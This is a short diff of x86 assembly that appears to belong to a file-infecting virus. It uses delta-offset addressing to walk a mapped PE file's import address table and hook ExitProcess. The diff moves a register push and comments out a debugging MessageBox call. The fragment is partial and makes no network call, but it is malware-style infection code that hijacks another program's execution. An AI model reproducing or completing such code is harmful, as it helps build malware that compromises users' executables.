@@ -1,3 +1,5 @@
+push	esi ; Keep start section
+
 ; IAT Hooking (ExitProcess)
 mov	[DELTA VAKernelIAT], 0
 ; Check if valid
@@ -11,7 +13,6 @@ sub	edi, eax
 mov	eax, [DELTA PeFileMap]
 add	edi, eax ; IAT
 
-push	esi ; Keep start section
 ; Iterate on all IAT Modules
 iterateIAT:
 mov	edx, edi
@@ -61,13 +62,13 @@ pop	edx
 cmp	eax, 0
 jne	nextIterateFunc
 
-pusha
-push	0
-push	ebx
-push	ebx
-push	0
-call	[DELTA pMessageBox]
-popa
+; pusha
+; push	0
+; push	ebx
+; push	ebx
+; push	0
+; call	[DELTA pMessageBox]
+; popa
 
 ; We found it ! Get VA
 ; Get Array of VA
